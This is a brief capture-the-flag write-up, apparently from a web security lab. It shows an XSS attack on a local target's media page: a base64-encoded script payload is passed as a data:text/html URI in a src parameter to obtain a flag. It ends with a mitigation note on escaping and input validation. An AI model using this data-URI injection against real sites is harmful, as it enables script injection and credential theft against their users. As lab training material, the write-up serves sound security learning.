On home page we can see that the nsa_prism.png is inside a link. 
If we click on the image we can see a page with a GET request with this :
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3

So apparently we can send text/html, so we try :

We base64 the following :
<script>alert("coucou");</script>
-> PHNjcmlwdD5hbGVydCgiY291Y291Iik7PC9zY3JpcHQ+

http://local_IP/?page=media&src=data:text/html;base64PHNjcmlwdD5hbGVydCgiY291Y291Iik7PC9zY3JpcHQ+

and we get the flag.

From wikipedia : 

"The data URI can be utilized to construct attack pages that attempt to obtain usernames and passwords from unsuspecting web users.
It can also be used to get around cross-site scripting (XSS) restrictions, embedding the attack payload fully inside the address bar."

To prevent you can escape data and use a proper input validation before actually use that data.
